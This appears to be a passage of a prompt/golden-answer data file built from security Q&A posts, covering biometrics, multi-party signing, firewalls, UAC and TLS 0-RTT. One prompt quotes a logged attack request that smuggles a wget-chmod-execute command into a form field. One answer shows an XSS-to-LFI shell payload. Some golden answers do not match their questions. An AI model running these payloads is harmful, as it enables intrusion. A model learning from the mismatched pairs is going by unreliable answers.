        "golden_answer": " <p>I am of the school of thought that Biometrics are NEVER acceptable to use as the only authentication method, you leave your Biometric data everywhere, it is almost a security paradox. I can lift fingerprints off of your keyboard, car, or elevator panel, I can make a voice recording of you, I can take your picture, get your face off a security camera, and I am Bad Guy Bob - I will jump you at your car and cut off/scoop out whatever I need.</p>\n\n<p>Some other examples/articles of people who think BMs are negligent to use:</p>\n\n<ul>\n<li><a href=\"http://www.makeuseof.com/tag/6-reasons-biometrics-not-way-future/\" rel=\"nofollow\">http://www.makeuseof.com/tag/6-reasons-biometrics-not-way-future/</a></li>\n<li><a href=\"http://www.usatoday.com/story/cybertruth/2013/09/12/why-biometrics-dont-work/2802095/\" rel=\"nofollow\">http://www.usatoday.com/story/cybertruth/2013/09/12/why-biometrics-dont-work/2802095/</a></li>\n<li><a href=\"http://www.csoonline.com/article/2891475/identity-access/biometric-security-is-on-the-rise.html\" rel=\"nofollow\">http://www.csoonline.com/article/2891475/identity-access/biometric-security-is-on-the-rise.html</a></li>\n</ul>\n\n<p>You also have to realize that there is an error-of-margin built into these Biometric security solutions, all it takes is for your to roll your finger on the scanner wrong or squint with a retinal scanner for it to scream at you and say ACCESS DENIED - making them easier to defeat, and unlike changing a password, or salting a hash, you cannot change your fingerprints easily nor change your retinas - once you are compromised, and use biometrics extensively, there is no way to quickly change.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have the following case scenario: \nOne document that needs to be signed digitally (using an external signing service) by 4 different people. The 4 people must be present while signing the document at the same place. </p>\n\n<p>How can I create a situation where \"digitally speaking\" is ensure that the 4 people were signing while being together? </p>\n\n<p>I thought that if each one of them uses the same computer (each of them logging in the signing service) that would be a way since it is the same datamachine (same IP). Are there any others?</p>\n\n\nAssistant:",
        "golden_answer": " <p>For a non-technical solution: How about taking a picture of the four of them in the same room together, possibly holding a newspaper to give a \"no-earlier-than\" date, and maybe a printout of the document, and add the picture to the document to be signed?</p>\n\n<p>I'm fairly confident that this would convince most people that the four people in the picture came together in order to sign the document in question, especially if the signature service gave the same date for when the signatures were made as the date visible on the newspaper in the picture.</p>\n\n<p>This is assuming that you can't have a trusted person present that can simply vouch for the four people all being there with his own signature on the document.</p>\n\n<p>If it's just that you must each witness that the others have signed, you might do it like this:</p>\n\n<p>A signs the document.</p>\n\n<p>B signs A's signature.</p>\n\n<p>C signs B's signature.</p>\n\n<p>D signs C's signature.</p>\n\n<p>A signs D's signature.</p>\n\n<p>B signs A's 2nd signature.</p>\n\n<p>C signs B's 2nd signature.</p>\n\n<p>(You need B and C to sign again to prove that they know about D's signature, too. If you stop after A signs D's signature, you have no way to know whether B and C know that D signed).</p>\n\n<p>I also have an idea that uses zero-knowledge proofs, but this is so convoluted that I don't think it would interest you.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I have identified a stored XSS and I'm wondering, how could I leverage that vulnerability to upload a shell.</p>\n\n\nAssistant:",
        "golden_answer": " <p>XSS is a client side attack, but it can sometimes be used to leverage a bigger attack against the server.</p>\n\n<p>Say there was a page that the admin user only had access to as the first thing it does was to check the user has appropriate permissions.</p>\n\n<p>e.g. <code>http://www.example.com/admin/delete_user.php?id=3&amp;lang=en</code></p>\n\n<p>It might be that the <code>lang</code> parameter points to a PHP include file:</p>\n\n<pre><code>include($_GET['lang'].'.php');\n</code></pre>\n\n<p>In which case the attacker could embed the string</p>\n\n<pre><code>&lt;img src=\"http://www.example.com/admin/delete_user.php?id=3&amp;lang=../../uploads/foo\" /&gt;\n</code></pre>\n\n<p>in order to include the <code>foo.php</code> that the attacker has managed to get onto the server (by other means, such as file upload functionality that was thought to be secure as it uploaded outside the web root) and gain file execution, or even a reverse shell. The file would be included and executed whenever an admin accessed the page containing the stored XSS vulnerability. Alternatively, a remote file may be included using a URL (e.g. in PHP if <a href=\"http://php.net/manual/en/filesystem.configuration.php#ini.allow-url-include\" rel=\"nofollow\">allow-url-include</a> is enabled).</p>\n\n<p>This very much depends on the site in question, and in this case the attacker would need to have knowledge that such a LFI (or RFI) vulnerability existed. This is not such a leap, as many applications are open source so an attacker would be able to install their own local copy in order to investigate such weaknesses.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Do there exist physical security devices for USB sticks that serve a function analogous to laptop locks (i.e. preventing smash-and-grab type attacks)?</p>\n\n<p>If so, what are they and to what extent do they offer protection? </p>\n\n<p>Example scenario: I plug a $250 USB SSD key into my laptop and work in a coffee shop. The attacker yanks out the key on their way out the door and starts running. Even if my data is encrypted, I'm out $250 + any data since my last backup.</p>\n\n\nAssistant:",
        "golden_answer": " <p>The problem with most USB thumb drives is that they stick out a whole lot, but you can buy smaller USB drives that will fit snug against your laptop. The problem is that obviously they will be much smaller capacity, but you'll get that security.</p>\n\n<p>Something like this: </p>\n\n<p><img src=\"https://i.stack.imgur.com/Zwu2O.jpg\" alt=\"http://i.imgur.com/zkWkS.jpg\"></p>\n\n<p>Additionally, since most laptops have this feature anyway, you could use a SD card, since that will fit right into your laptop, not exposing itself at all. A potential thief/attacker would have no idea it's even there unless they nabbed your laptop.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>The format is 1 letter + 5 numbers (e.g. A12345).\nAny method and software?</p>\n\n\nAssistant:",
        "golden_answer": " <p>If you set up a system to block you, you would ultimately also be able to bypass it.</p>\n<p>The best way would be for you to place it outside of your reach. An option would be to burn a CD/DVD-R, so that you cannot physically change it. I don't know if whatever will make you want to change it could also make you want to destroy it. You could provide the disk with the never-to-be-changed file to a third party, such as a lawyer. You could also publish the file on the internet, in such a way that it would be very hard for it to disappear. You could share it on keybase, IPFS, a Dropbox account you purposefully lose the password to, get it uploaded to archive.org...</p>\n<p>You can also use a similar approach to restrict you from modifying it, such as tweeting today the full hash of the file, so you couldn't change it into the future without revealing that it is not the original file.</p>\n<p>Note that you could publish an encrypted version encrypted, so it doesn't show its contents to the world.</p>\n<p>Finally, if you really know so well that in the future you will want to change it, I wonder if it's really a good idea that you make your future self unable to do that.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I understand that CPU silicon (for example) is scrutinized for backdoors but there are other aspects of a computer system that may \"leak data\" to the outside world unbeknownst to the owner regardless of driver or OS configuration.</p>\n\n<p>I'm looking for advice on how to protect myself from hardware-based exploits such as CPU-silicon backdoors, Bluetooth or wifi hardware-based vulnerabilities, or even hacks in BIOS of the motherboard or any connected devices.  </p>\n\n<p>Some examples of a hardware hack could include</p>\n\n<ul>\n<li>A hard drive that has <a href=\"https://www.schneier.com/blog/archives/2014/01/iratemonk_nsa_e.html\" rel=\"nofollow noreferrer\">modified firmware (e.g. IRATEMONK)</a></li>\n<li>Setting a jumper pin to enable discreet functionality </li>\n<li>A undocumented keyboard sequence (other than control-alt-delete) that bypasses a BIOS password</li>\n<li><p>A bluetooth receiver that \"wakes up\" when a magic packet is seen</p></li>\n<li><p>An integrated camera and microphone that records data to NVRAM when conditions apply</p></li>\n<li><p>A GPS receiver that wakes up when at a certain location.</p></li>\n</ul>\n\n<p><strong>Question</strong></p>\n\n<p>What guidelines should I follow to purchase hardware (computers, networking equipment, <a href=\"https://security.stackexchange.com/q/24810/396\">power supplies</a>, etc) that is secure at a hardware &amp; <a href=\"http://spritesmods.com/?art=hddhack\" rel=\"nofollow noreferrer\">firmware</a> perspective?  (before the OS level)</p>\n\n<p>The answers I'm looking for could be either legal/contractual, or technical in nature.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Your questions is about preventing the inclusion of hardware that contains intentionaly created backdoors, but I suggest that in addition to prevention you consider detection, mitigation, and response.</p>\n\n<p>There are different levels of sophistication in creating and detecting hardware backdoors. So, in part you need to understand your own level of expertise in detecting intentional hardware vulnerabilities. Doing design analysis is a good place to start. The general architecture should make sense and be familiar. A true from scratch hardware design is quite rare. Therefore look for the components of the design that deviate from previous revisions and other design for similar components. </p>\n\n<p>Perform your own hardware security testing. Using your system security design create tests for the given piece of hardware and attempt to determine whether it passes or fails your security model for the intended system. </p>\n\n<p>Mitigation of hardware security issues include strategies such as treating as much hardware as possible as untrusted and only investing trust in hardware that is critical to the secure operating of your system.</p>\n\n<p>Only do business with people you trust in jurisdictions where harms done by companies and individuals may be fairly adjudicated. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Most newsletters that I receive use mass-mailing software that rewrites links to add tracking information.  That is, instead of <code>www.google.com</code>, the email will point to something like <code>links.somecompany.com/?xyz=unique-id</code>, which redirects to the final URL.  Mailchimp, for example, calls this <a href=\"https://mailchimp.com/help/enable-and-view-click-tracking/\" rel=\"noreferrer\">click tracking</a>.  29 of the last 30 mass emails I received included tracking links.</p>\n\n<p>Is there a way to opt out of this tracking, or to visit the final link without being tracked?  Something like do-not-track for email links, or a centralized way to opt out of click tracking from most larger email marketers?</p>\n\n<p>Alternatively, do any email providers take measures against this? (Gmail has <a href=\"https://gmail.googleblog.com/2013/12/images-now-showing.html\" rel=\"noreferrer\">defenses</a> in place against pixel beacons, I think, but nothing against click tracking as far as I can tell).</p>\n\n\nAssistant:",
        "golden_answer": " <p>Of the two main forms of email tracking, remote content has easier protections. Many email clients allow you to turn this off. You can test your email client settings here: <a href=\"https://www.emailprivacytester.com\" rel=\"noreferrer\">https://www.emailprivacytester.com</a></p>\n\n<p>Click tracking is harder to avoid. There may be some trackers that allow an after-the-fact \"opt out\", but that's risky and is not likely to allow you to delete the data (more likely to only suppress targeting based on the data collected, if these \"opt outs\" exist at all).</p>\n\n<p>A few possible strategies:</p>\n\n<ul>\n<li>Hover over links to see if there's a tracker, and if there is, <em>neve</em>r click;</li>\n<li>Use a browser to search or surf to the sender's website and find the content manually;</li>\n<li>Add chaff to the tracking by using a script that repeatedly \"clicks\" the links. This could help disguise when and how often the link is manually clicked, but in practice is challenging because you'd have to mimic the fingerprint of the email client;</li>\n<li>Copy the link and paste it into a privacy-protective browser like Tor. They'll know you \"clicked\" and when, but they won't get your real IP address or device fingerprint, and therefore their ability to correlate that \"click\" with your other internet activity is minimized.</li>\n</ul>\n\n<p>Click tracking triggers a range of privacy violations (read receipt, time of click, device and email client data, etc.) The best strategy depends on your priorities for which violations you are trying most to defend against.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I want to be 100% sure that my machine only connects where and when I want it to. \nIf I use a firewall that blocks all UDP and TCP packets but those that I explicitly allow to pass, can I be 100% sure that my machine does not connect anywhere without my approval?</p>\n\n<p>For example, if I did not know about UDP at all and only specified TCP rules on the firewall, I would still be vulnerable to malware and nasty spyware exploiting UDP packets. So technically speaking, is there any other means/protocols apart from UDP and TCP that can be used to communicate with a computer using wired/wireless network connections? Also, can UDP and TCP packets bypass firewalls?</p>\n\n<p>The question has arisen when I installed Little Snitch on my Mac with OS Mavericks and noted that my machine tries to connect to various Apple and third party servers even though I told it that I did not want any info to be collected and sent. Some of the connections were obviously fine (e.g. ntp time syncs), but others were questionable to say the least. I know that hard/software manufacturers potentially can embed backdoors and snitches and so I am trying to figure out how feasible it is in theory (and practice) to have reliable/robust \"border control\" on my machine.</p>\n\n\nAssistant:",
        "golden_answer": " <p>The following is only valid if an attacker is not able to control parts of\nyour network, e.g. DNS servers or routers; if so, you are doomed anyway :)</p>\n\n<blockquote>\n  <p>If I use a firewall that blocks all UDP and TCP packets but those that I explicitly allow to pass, can I be 100% sure that my machine does not connect anywhere without my approval?</p>\n</blockquote>\n\n<p>While you can be sure that your machine doesn't connect to servers/ports you did not allow, you cannot be sure that no back channel to attackers exists. If your machines have DNS allowed, the foot-in-the-door might be a covert DNS channel, even if you allow your own DNS servers only.</p>\n\n<p>For an intro to covert channels, see <a href=\"http://www.sans.org/reading_room/whitepapers/dns/detecting-dns-tunneling_34152\" rel=\"nofollow\">\"Detecting DNS-Tunnels\"</a> and <a href=\"http://www.sans.org/reading-room/whitepapers/detection/covert-channels-33413\" rel=\"nofollow\">\"Covert Channels\"</a> by SANS Reading Room. </p>\n\n<blockquote>\n  <p>For example, if I did not know about UDP at all and only specified TCP rules on the firewall, I would still be vulnerable to malware and nasty spyware exploiting UDP packets. So technically speaking, is there any other means/protocols apart from UDP and TCP that can be used to communicate with a computer using wired/wireless network connections? </p>\n</blockquote>\n\n<p>See <a href=\"http://en.wikipedia.org/wiki/Stream_Control_Transmission_Protocol\" rel=\"nofollow\">SCTP</a>, but this must be available on your machine (don't know about defaults). </p>\n\n<blockquote>\n  <p>Also, can UDP and TCP packets bypass firewalls?</p>\n</blockquote>\n\n<p>Usually no, but if you have IPv4 and IPv6 enabled and configured your firewall for IPv4 only, then packets might get out via IPv6.</p>\n\n<p>Otherwise, I don't know a way to bypass a packet filter.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Me and my friend want to sell game server-side software, but we want some sort of control, over use of that software.</p>\n\n<p>For example, we want some sort of serial key system, so only verified/paid systems, can run our software. We are concerned, that software will be exploited/resold/distributed freely and we wont get any income from that.</p>\n\n<p>How should we approach this problem? Is there any ready solutions? How about h-/crackers, is there any medicine against tinkering code and removing/explore/exploit our serial key system? Do we need to encrypt in some sort of way our server side software, so it will be hard to deal with? What about key/license server side solutions?</p>\n\n<p>Not distributing any code, server is compiled C++ executable, running on windows machine.</p>\n\n<p>Target audience is individuals, not companies. This is first time, we have no experience in selling software, but we have individuals, that are willing to pay - we just don't want our server end up cracked and distributed all around the globe, for at least year or two, after release of first version.</p>\n\n\nAssistant:",
        "golden_answer": " <p>I'm not sure what sort of software are you distributing.</p>\n\n<p>Are you </p>\n\n<ol>\n<li><p>Selling software to game development/hosting companies?</p></li>\n<li><p>Selling access to software hosted on your servers?</p></li>\n</ol>\n\n<p>If it's 1), have you ever considered using the power of the law to your advantage? Basically sue the pants off any company who uses your software without permission.</p>\n\n<p>If it's 2), you have a wide variety of options available. You can tie access to an API key which you sell, or issue certificates which allow access to your servers.</p>\n\n<p>Since you said the software is intended for server side use it probably won't apply to you, but attempting to add DRM to any widely distributed software is an exercise in futility. Any DRM scheme can be bypassed given a determined enough attacker.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I know nothing about cryptography. How does one encrypt a file in the <strong><em>strongest</em></strong> possible way, such that it can be accessed some years later?\nI prefer that it should be fairly resistant from brute force and other possible ways attacks.</p>\n<p>I need some direction only.</p>\n\n\nAssistant:",
        "golden_answer": " <p>The strongest possible way to encrypt data is to start with a threat model.  What sort of adversary are you trying to protect your data from?  What are they willing to do to get it?  All reasonable approaches to cryptography start with one.  If you start with one, you stand a chance of finding &quot;the strongest&quot; for your particular situation.</p>\n<p>I recommend this approach because, as you start thinking about threat models and researching them, you'll start to realize that security is far more about the human element.  Then you can worry about things like how you will secure your key.</p>\n<p><a href=\"https://i.stack.imgur.com/VGrRf.png\" rel=\"noreferrer\"><img src=\"https://i.stack.imgur.com/VGrRf.png\" alt=\"XKCD commic on security\" /></a></p>\n<p><sub>source: <a href=\"https://xkcd.com/538/\" rel=\"noreferrer\">https://xkcd.com/538/</a></sub></p>\n<p>Once you have decided whether you are trying to outwit a state actor while committing treason, or just merely trying to protect your diary from the prying eyes of your little sister, you can decide what the best algorithm is.</p>\n<p>Failing that, go with the flow.  Rather than finding out what is the &quot;strongest&quot; encryption, look for what is &quot;recommend&quot; by the security experts for someone who knows nothing of cryptography.  Currently AES comes highly recommended.  We're quite confident that nobody short of a state actor can break it, and we are reasonably confident that no state actor can break it either.</p>\n<p>But better yet, don't look for encryption algortihms, look for tried and true packages which are recommended.  The application of an algorithm is as important as the algorithm itself.  Highly reputable implementations are worth their weight in gold.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I suspect that an android device is trying all SSIDs it was ever connected during wifi scan. 1) It alone gives enough information to identify the device 2) If a network with no encryption is saved, a MitM attack can be performed.</p>\n\n<p>Is there a way to handle it? E.g. trying only networks that are in the range (listen for beacons). It will make impossible to connect to hidden SSIDs, but who uses it?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>I suspect that an android device is trying all SSIDs it was ever connected during wifi scan. 1) It alone gives enough information to identify the device 2) If a network with no encryption is saved, a MitM attack can be performed.</p>\n</blockquote>\n\n<p>This would be typical of most mobile devices if you store the connection in a way where it will automatically connect again at a future time.</p>\n\n<blockquote>\n  <p>Is there a way to handle it? </p>\n</blockquote>\n\n<p>Yes. You can do so by doing whatever combination of the below you like. This will at least limit your exposure.</p>\n\n<ul>\n<li>Don't store you wireless networks so you can connect automatically in the future. </li>\n<li>Delete wireless networks when you are done.</li>\n<li>Disable wireless on your device when you don't want to be connected.</li>\n</ul>\n\n<blockquote>\n  <p>E.g. trying only networks that are in the range (listen for beacons). </p>\n</blockquote>\n\n<p>In comments elsewhere, you seem to find \"passive scanning only\" as an appealing solution. This will significantly increase times for a device to connect to a wireless network (from your reported 3+ seconds to something more like 6-20+ seconds) and have the potential to create what appear to users as \"outages\" of similar periods every time the device scans to check for better networks to which they can roam.</p>\n\n<p>Put simply, it won't happen. Why? Because it is asking for developers to add a feature that (a) decreases usability by increasing time taken to find/connect to networks and (b) impacts modern devices more significantly than legacy devices. Or put another way, how many users do you think would be pushing developers to \"significantly increase the times it takes to connect to a wireless network\"?</p>\n\n<p>Automatically trying to connect to any configured SSID as if were hidden was a change made to simplify the user experience and make it easier for the masses. As in many such feature decisions, this does come at a cost for potential security/privacy issues. You will find little support in developer circles for going back on this decision and increase the number of [confusing] choices people [with little technical knowledge] need to make when connecting to a wireless network.</p>\n\n<p>A better and more likely suggestion that you could make is an option (global or per profile) to \"allow connections to hidden networks\" that would be enabled by default and provide the existing behavior. Knowledgeable users could then choose to disable it if they wanted, and the active scanning for networks taking place could do so without including an SSID. No negative impact from disabling active scanning necessary. </p>\n\n<p>Still a tough sell since there are many features users [in larger numbers] want for their devices and developers tend to follow the demand, but more viable than the prior suggestion.</p>\n\n<blockquote>\n  <p>It will make impossible to connect to hidden SSIDs, but who uses it?</p>\n</blockquote>\n\n<p>Many organizations do and some home users. Personally I find very few cases where it is used for a valid reason, but my opinion doesn't stop people from using hidden SSIDs.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I've got a DigitalOcean server that I use for different temporary servers. Lately I've found that sometimes I get a constant spam of the following requests:</p>\n\n<pre><code>POST http://127.0.0.1/cgi-bin/ViewLog.asp\n\nHeaders:\n    Host: 127.0.0.1\n    Connection: keep-alive\n    Accept-Encoding\": gzip, deflate\n    Accept: */*\n    User-Agent: B4ckdoor-owned-you\n    Content-Length: 176\n    Content-Type: application/x-www-form-urlencoded\n\nBody:\n{\n    \" remote_submit_Flag\": \"1\", // Space is not a typo\n    \"remote_syslog_Flag\": \"1\",\n    \"RemoteSyslogSupported\": \"1\",\n    \"LogFlag\": \"0\",\n    \"remote_host\": \";cd /tmp;wget http://152.44.44.68/d/xd.arm7;chmod 777 xd.arm7;./xd.arm7;rm -rf xd.arm\"\n}\n</code></pre>\n\n<p>Which does not really bother me since I run Node.js servers only. What bothers me is the repetition of the attack and the <code>Host</code> header (although I believe this one can be faked).</p>\n\n<p>I've used to run a DNS server that defaulted to Google DNS, that I left unattended for some time and it gathered 1.5TB of traffic in one month. The <code>named -v</code> shows version <code>9.11.3-1ubuntu1.12-Ubuntu</code>. </p>\n\n<p>Is the server compomised?</p>\n\n\nAssistant:",
        "golden_answer": " <p>Since the ISP knows the owner (the one who pays the bills) and street address of the shared IP address police will likely start there. They might simply confiscate the systems in this home and question the inhabitants for more information, i.e. do it the analogue way and not try to somehow trace some internal computer back through the internet.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Today I had an idea: I've been thinking that one can use brute force to get some data from a university from our country.</p>\n\n<p>It turned out my thoughts were true: an attacker can use brute force to reveal sensitive information.</p>\n\n<p>How strong should be the protection against brute force for an application, for instance this university website?</p>\n\n<p>In my case, I'm thinking to notify the right people about this so they can address it the right way (even I think they won't care at all).</p>\n\n<p>According to the laws of my country, getting and manipulating the information that one can get from this university is illegal.</p>\n\n<p>I'm thinking of the following scenario: I will probably announce the people that take care of that website, and maybe they will say: <em>attacking us is illegal anyways</em>––should they still care about my report?</p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>this is illegal anyways––should they still care about my report?</p>\n</blockquote>\n\n<p>Very much so.</p>\n\n<p>To give one of a by now long series of such examples, consider (one of) the Yahoo hack, for example the <a href=\"https://www.theguardian.com/technology/2016/dec/14/yahoo-hack-security-of-one-billion-accounts-breached\" rel=\"nofollow noreferrer\">1 billion account hack</a> reported in late 2016 (see also <a href=\"https://krebsonsecurity.com/2016/12/yahoo-one-billion-more-accounts-hacked/\" rel=\"nofollow noreferrer\">Krebs's coverage</a>).</p>\n\n<p>To quickly cover why \"this is illegal anyway\" is not a legitimate response:</p>\n\n<ul>\n<li>Yahoo had some sensitive data (in this case, user emails, passwords, and possibly more) stolen, yet Yahoo still has a duty to announce (and investigate) the hack</li>\n<li>that duty extends to its financial reporting, as explained in the footer of one of their <a href=\"https://yahoo.tumblr.com/post/154479236569/important-security-information-for-yahoo-users\" rel=\"nofollow noreferrer\">press releases about the impact to users</a>: </li>\n</ul>\n\n<blockquote>\n  <p>More information about potential risks and uncertainties of security breaches that could affect the Company’s business and financial results is included under the caption “Risk Factors” in the Company’s Quarterly Report on Form 10-Q for the quarter ended September 30, 2016, which is on file with the SEC and available on the SEC’s website at www.sec.gov.</p>\n</blockquote>\n\n<ul>\n<li>depending on your country, the duty of reporting may also be tied to fines and other legal or financial consequences (<a href=\"https://iapp.org/news/a/eu-data-breach-notification-rule-the-key-elements/\" rel=\"nofollow noreferrer\">Europe</a>, for example). </li>\n</ul>\n\n<p>All this tends to focus on Personally Identifiable Information (PII), but in the case of a university, the loss or theft of research (particularly when not protected by patents) could impact the financial status of the university. \nNot to mention the fact that universities do also hold PII, and so a breach would need to be investigated to determine what kind of data may have leaked. </p>\n\n<p>I am not a lawyer, but there are so many cases where, at the very least, investigation would be warranted (if not required to determine the legal consequences), that I think the report would (assuming it was felt to be reliable, and accurate) given attention. </p>\n\n<p>If you provide bad (or even overly noisy) reporting, then it may be they will ignore <em>your</em> report. But I would be surprised if conclusive evidence of a breach would be ignored. </p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>A little while ago I got the following email from an unknown party (using an <code>@alum.cs.[redacted].edu</code> email address):</p>\n\n<blockquote>\n  <p>I'm seeing attack traffic from your Linode. Just a friendly heads up that its likely p0wned. A quick google suggests no one else likes the traffic coming from your Linode either.<br>\n  <code>&lt;https://www.google.com/search?q=[my Linode's IP]&gt;</code></p>\n</blockquote>\n\n<p>However I couldn't find any evidence to support this assertion. I checked the resource utilization graphs provided by Linode, as well as my firewall logs, system's process list, active connections, recently modified files, user accounts, and so on, and found absolutely no anomalies. The results from the Google search didn't seem to back up the claim that nobody else likes the traffic either; nothing I saw in the first few results raised any red flags. So either the server is fine, or I'm dealing with an adversary who knows how to cover their tracks so well that I can't imagine why they would have any interest in my Linode. (There is no sensitive data on it.)</p>\n\n<p>This leads me to wonder whether the message could have been a form of phishing. In this particular case, I doubt it, but could something like this be a legitimate social engineering tactic? Is there something I would be likely to reveal by replying to this message which could be used against me in some way I can't think of?</p>\n\n<p>If and when this happens in the future, my goal is to respond in a way that allows me to collect the information I need to track down the attack in case it is real, while not revealing anything too compromising in case it isn't real.</p>\n\n\nAssistant:",
        "golden_answer": " <p>The message itself isn't phishing, but it could be the first stage of a social engineering attack. </p>\n\n<p>The message (that you quoted) isn't asking you to do anything specific, so it is benign. But, if you reply asking for further details, they might ask you to do something specific (run a program, log into their service, etc.), which would be an attack.</p>\n\n<p>Otherwise, the person could be confused. I see no harm in replying and seeing what the next step is.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>A user has a PowerShell script that does some things that require administrative access on Windows Server 2012 with UAC enabled. </p>\n\n<p>When they run the script as a Local Administrator, it fails with access denied. But if they elevate their permissions and run the script as an administrator, it works. So far, so good. </p>\n\n<p>Now, they have a custom <strong>Windows Service</strong> that runs the PowerShell script. The Windows Service is configured to run under the same Local Administrator account (i.e., not Local System/Network Service/etc.). The script fails with access denied, as if the account isn't an administrator. On older versions of Windows, the script works fine. </p>\n\n<p>How does UAC apply in the world of Windows Services? I assumed that a Windows Service that was run under a custom local administrator account would always be \"elevated\", but in this case it seems that isn't true. </p>\n\n\nAssistant:",
        "golden_answer": " <blockquote>\n  <p>When they run the script as a Local Administrator, it fails with access denied.</p>\n</blockquote>\n\n<p>Then this means that being a \"Local Administrator\" is not sufficient to run the script. This proves that \"Local Administrator\" does not cover the full set of rights on the machine. In the context of <a href=\"http://technet.microsoft.com/en-us/library/cc709628%28v=ws.10%29.aspx\" rel=\"nofollow noreferrer\">UAC</a>, a \"Local Administrator\" does not have the full rights of an \"administrator\" (as seen by the OS), but, when it asks to do something which requires administrative rights, the UAC intercepts the call and instead of just unceremoniously rejecting the request with an error code, it <em>prompts the user</em>. If the user says \"yes, go on\", then the process is granted elevated rights. From the point of view of the process, everything works as if it had been a \"true administrator\" all along.</p>\n\n<p>Services do not run in a session, but \"as a service\". This means that there is no user to prompt. Therefore, UAC, as configured by default, cannot grant \"true administrator\" rights on demand.</p>\n\n<p>Apparently, you can configure UAC to never prompt, and instead grant the rights (which basically nullifies the security benefits, if any, of UAC); see for instance <a href=\"http://blog.builtbp.com/2011/11/service-user-access-control-uac-prevents-windows-system-service/\" rel=\"nofollow noreferrer\">this blog post</a>). A better solution would be to run the service as an account which is already a true administrator, not the cheap imitation going under the pompous name of \"Local Administrator\".</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>The specifications for <a href=\"https://datatracker.ietf.org/doc/html/draft-ietf-tls-tls13-21#section-8\" rel=\"nofollow noreferrer\">TLS 1.3 0-RTT</a> mention the following threat which an attacker might realize:</p>\n<blockquote>\n<p>Network attackers who take advantage of client retry behavior to\narrange for the server to receive multiple copies of an\napplication message.  This threat already exists to some extent\nbecause clients that value robustness respond to network errors by\nattempting to retry requests.  However, 0-RTT adds an additional\ndimension for any server system which does not maintain globally\nconsistent server state.  <strong>Specifically, if a server system has\nmultiple zones where tickets from zone A will not be accepted in\nzone B, then an attacker can duplicate a ClientHello and early\ndata intended for A to both A and B</strong>.  At A, the data will be\naccepted in 0-RTT, but at B the server will reject 0-RTT data and\ninstead force a full handshake.  If the attacker blocks the\nServerHello from A, then the client will complete the handshake\nwith B and probably retry the request, leading to duplication on\nthe server system as a whole.</p>\n</blockquote>\n<p>My question is: Where is the attack? At the end of the day, the attacker could as well just have passed his copy of the ClientHello to Zone B and get the same outcome (a full handshake). What am I missing?</p>\n\n\nAssistant:",
        "golden_answer": " <p>You aren't missing that much. I think this <a href=\"https://blog.cloudflare.com/introducing-0-rtt/\" rel=\"nofollow noreferrer\">cloudflare</a> article near the end outlines possible attack vectors and scenarios quite nicely. Depending on the security of the networks and web apps, 0-RTT may not be responded to pending what kind of parameters or certain types of headers. If an attacker has already figured out how to insert himself and gain visibility to what he would want to replay on a vulnerable host, there are worse risks elsewhere to look out for first. Something like a 0-RTT replay that has parameters and an authenticated session cookie and a HTTP downgrade could be plausible. But in the pentester's world, that's alot of work.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>I an thinking about this issue and it is hard to estimate technical impacts.</p>\n\n<p>For any relevant reasons, one want to modify one the x509 field of an intermediate CA. This intermediate CA was signed by root CA, and it has already issued some end certificates. </p>\n\n<p>I want Root CA to sign again this intermediate certificate because one field as changed (even a useless field), so the certificate produced a new hash, and so a new signature is made by the root. Suppose you replace the old one by the new certificate (its new signature), what is happening :</p>\n\n<ul>\n<li>Is intermediate certificate still trust ? I guess it is as the signature is valid (even if \"fresh\" one) and we can verify it with Root certificate.</li>\n</ul>\n\n<p>Also, as the intermediate public key has never changed, the end certificates are still valid, and we can verify it (with intermediate public key). </p>\n\n<p>So obviously, the intermediate certificate content has changed, but we can still use it as it is signed by Root, and its public key is still the same.</p>\n\n<p>I suppose there are impacts I couln't see.</p>\n\n\nAssistant:",
        "golden_answer": " <p>Signing will be done by the key only, so as long the key is not changed all signatures done by this certificate are still valid. But, when building the trust chain for a certificate it will look at the certificates issuer field and then search for a certificate having this issuer as the subject. Only after it found a certificate (or multiple) having this expected subject it will use them to verify the signature.</p>\n\n<p>This means, that you should be able to change any information in the certificate as long as the public key and the subject stay the same.</p>\n"
    },
    {
        "prompt": "\n\nHuman: <p>Aside from using browser headers, I want to blacklist/whitelist browser and plugins from my site so that I can prevent these older unpatched systems from (1) being a general user of my site (2) removing those 'targets' from would-be-attackers reach.</p>\n\n<blockquote>\n  <p>My goal is to define some kind of\n  endpoint security standard for users\n  who access my site, but without\n  directly managing the environment, as\n  they are customers.</p>\n</blockquote>\n\n<p>Is there a standard way to use Whitelisting or Blacklisting to control browser access to my site?  </p>\n\n<p>For example, I want to prevent any browser that has outdated Flash, but I want to permit them if they have no Flash at all.</p>\n\n\nAssistant:",
        "golden_answer": " <p><strong>First off</strong>: This is absolutely the wrong way to solve CSRF problems.  CSRF vulnerabilities are a problem in your site, not in the browser.  Blacklisting certain browsers is not going to solve your CSRF vulnerabilities.  CSRF is not browser-specific and cannot be prevented through browser blacklisting.</p>\n\n<p><strong>Detecting browser versions</strong>: There are various ways to detect what browser version and plugin versions the user is using.  For browser version, you can use the User Agent.  For Flash, you can use the <a href=\"http://www.adobe.com/products/flashplayer/download/detection_kit/\">Flash player detection kit</a>.  For Java, see Sun's <a href=\"http://java.com/en/download/installed.jsp?detect=jre&amp;try=1\">java update check</a>.  You'll want to check Quicktime, too, but I'm not sure how to do that.  Note, however, that detection of the browser version and plugin versions is difficult in Internet Explorer.</p>\n\n<p><strong>Knowing which versions are insecure</strong>: Maintaining the list of known-vulnerable browser and plugin versions is more difficult.  I think it's probably too much work to reasonably expect an ordinary site to maintain.  For browsers, a partial starting point is <a href=\"http://developer.yahoo.com/yui/articles/gbs/\">Yahoo's list 